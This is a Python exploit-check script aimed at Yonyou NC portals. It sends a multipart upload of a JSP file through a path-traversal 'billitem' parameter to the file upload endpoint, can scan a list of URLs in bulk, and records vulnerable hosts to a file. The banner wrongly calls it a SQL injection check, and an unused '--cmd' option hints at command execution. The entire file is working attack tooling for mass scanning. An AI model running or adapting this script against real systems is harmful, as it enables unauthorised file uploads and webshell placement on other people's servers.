import sys
import requests
import argparse

def checkVuln(url):
    if not url.startswith(('http://', 'https://')):
        url = f"http://{url}"
    data = """
--d0b7a0d40eed0e32904c8017b09eb305Content-
    Disposition:form-data;name="file";filename="test.jsp"Content-Type: text/plain
    
    <%out.print("hello world");%>
--d0b7a0d40eed0e32904c8017b09eb305--
        """
    vulnurl = url + "/portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'multipart/form-data;boundary=d0b7a0d40eed0e32904c8017b09eb305'
    }
    try:
        response = requests.get(vulnurl, headers=headers,data=data,timeout=5, verify=False)
        if "Plugin qvbvqqkbjq validate fail" in response.text:
            print(f"【+】当前网址存在漏洞：{url}")
            with open("../vuln1.txt", "a+") as f:
                f.write(url + "\n")
        else:
            print("【-】目标网站不存在漏洞...")
    except Exception as e:
        print("【-】目标网址存在网络链接问题...")


# 批量漏洞检测模块
def batchCheck(filename):
    with open(filename, "r") as f:
        for readline in f.readlines():
            url = readline.strip()
            if 'http' in url:
                checkVuln(url)
            else:
                url=f"http://{url}"
                checkVuln(url)


def banner():
    print("用户NC SQL注入检测")
    print(f"[+]{sys.argv[0]} --url htttp://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} --help 查看更多详细帮助信息")


# 主程序方法，进行调用
def main():
    parser = argparse.ArgumentParser(description='漏洞单批检测脚本')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
    parser.add_argument('-cmd','--cmd', type=str, help='执行命令')
    args = parser.parse_args()
    if args.url:

        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()


if __name__ == '__main__':
    main()